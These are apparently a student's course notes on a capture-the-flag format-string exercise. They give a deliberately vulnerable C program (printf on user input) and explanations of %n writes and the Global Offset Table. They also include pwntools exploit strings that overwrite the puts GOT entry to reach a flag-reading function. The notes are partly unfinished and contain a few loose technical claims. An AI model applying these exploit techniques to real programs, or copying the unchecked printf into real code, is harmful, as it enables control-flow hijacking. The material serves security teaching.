code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

void unscramble() {
	int fd;
	char buffer[64];

	if((fd = open("./flag.txt", O_RDONLY)) < 0){
		perror("open failed!\n");
		exit(1);
	}

	int c = read(fd, buffer, 64);
	write(STDOUT_FILENO, buffer, c);

	exit(0);
}
  

void readtext(){

	char buffer[64];

	fgets(buffer, 64, stdin);
	printf(buffer);
	puts("Text too scrambled to translate.");

	exit(1);

}

  

int main(int argc, char **argv){

	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL); 

	printf("%p\n", &unscramble);
	readtext();
}
```

### Code Analysis
- return address is never used! `exit(1)` is called before function returns
- no bufferoverflow

### %n
- stores the number of previous chars that have already been printed in printf into a given memory address.
- only counts chars from current call of printf
- it is an integer

### What if you don't specify for an addr to %n
- Looks in the register first for parameters
- Looks for parameters in the stack when they aren't in the registers.
- Can use #$ to look for specific parameter
- If parameter is a pointer to a writable section, it will write.
- COntrol where it writes by pointing to where is 

### Memory Leak
- ASLR but No PIE: Text Section can't be randomized
- Buffer starts at param6

Write to start of the buffer
```python
#Writes 3 to location
exploit_str = flat({
					0: "aaa%8$n",
					16: 0xdeadbeef
})

#make sure there are no \n chars
assert(b'\n' not in exploit_str)

p.sendline(exploit_str)

p.recvall()
p.wait()
```
- Use paremeter 8 because 0xdeadbeef has an offset of 16
- Will null bytes interrupt our format string?
	- Only if they occur before the %n store
	- We do need to worry about newline chars
- Maximum input size to buffer
	- We don't have arbitary control
	- at most 63 - size of 

## Where do we want to target
**Global Offset Table!!**

Calling of printf in format1
![[Screenshot 2023-04-10 at 1.44.57 PM.png]]
- calls `printf@plt`
- This is because it is **dynamically linked**, not linked until runtime
- PLT: represents known address
- Allows process to find libc
- printf has an entry in the GOT
	- Before function has been called: functions are in the text section
	- After function has been called: functions are in the libc section
	- means libc is a writable text section!!
- **What is the GOT**
	- The table your code looks to to find address of liibc functions
	- Before function has been called: functions are in the text section
	- After function has been called: functions are in the libc section
	- Region of memory that contains a bunch of code pointers!!
	- When PIE is disabled, It does not move around!
- GEF command to view Global Offset Table: `got`

**Goal: Manipulate GOT entry to point to win function**
- use `puts()`! (because it is called before exit())
- write the address of `unscramble()` to puts entry in GOT
- We only have 63 chars!

### Writing the Correct Val
- understanding %n
```c
#include<stdio.h>

int main() {
	int count = 0;


	// Count will be 4
	printf("abcd%n", &count);
	printf("\nCount: %d %x\n", count, count);

	// Count should be 4 after this call, as the %n does not
	// count characters from previous calls to printf
	printf("abcd%n", &count);
	printf("\nCount: %d %x\n", count, count);

	//Count 5 because len("hello") is five
	printf("%s%n", "Hello", &count);
	printf("\nCount: %d %x\n", count, count);

	// Count 256, padded with spaces
	printf("%256s%n", "Hello", &count);
	printf("\nCount: %d %x\n", count, count);

	// Count 0, hex(256) == 0x0100

	count = 0;

	printf("%256s%hhn", "Hello", (char *)&count);
	printf("\nCount: %d %x\n", count, count);

  

	// Count 0, hex(256) == 0x0100
	// These lines behave the same as the example above,
	// but gcc will throw up warnings
	//count = 0;
	//printf("%256s%hhn", "Hello", &count);
	//printf("\nCount: %d %x\n", count, count);

  

	// Count: 16776960 ffff00
	count = 0xffffff;
	printf("%256s%hhn", "Hello", (char *)&count);
	printf("\nCount: %d %x\n", count, count);
	/*
	hhn - takes the least signifcant byte 
	hn - takes the least significant two bytes
	*/


	// Count: 16711935 ff00ff
	count = 0xffffff;
	printf("%256s%hhn", "Hello", (char *)&count + 1);
	printf("\nCount: %d %x\n", count, count);
	/*
	writing one byte at a time to memory
	you can also concatanate bytes
	*/

}
```
- use %(num)s to pad with spaces
- make sure that the %s is pointing to a readable address, or else it will segfault
```python
#Writes 3 to location
#win funct: 0x400704
#all other got entries have the same first two bytes(0x40)
#only write 07e7
#creates 0x4007e7
exploit_str = flat({
					0: "%2023p%8$hn",
					16: 0x601018
})

#make sure there are no \n chars
assert(b'\n' not in exploit_str)

p.sendline(exploit_str)

p.recvall()
p.wait()
```
- place breakpoint on call to `printf()` (where format string should corrupt) and `puts()` (where win function should be called)

**write 0xdeadbeef into got**
```python
#Writes 3 to location
#win funct: 0x400704
#all other got entries have the same first two bytes(0x40)
#only write07e7
#0xdead - 0xbeef = 8126
exploit_str = flat({
					0: "%48879p%9$hn%8126s%10$hn",
					24: 0x601018, #overwrites two bytes here
					32: 0x601018+2 #ovewrites two bytes here
})
#write 0xbeefdead
exploit_str = flat({
					0: "%48879p%10$hn%8126s%9$hn",
					24: 0x601018, #overwrites two bytes here
					32: 0x601018+2 #ovewrites two bytes here
})



#make sure there are no \n chars
assert(b'\n' not in exploit_str)

p.sendline(exploit_str)

p.recvall()
p.wait()
```

### Write-What-Where
Two examples from the course
1. using `%n` to write to a specified address, placed adjacent on the stack normally (or wherever you find the `%n` is taking its address)
There needs to be some place of memory where you can control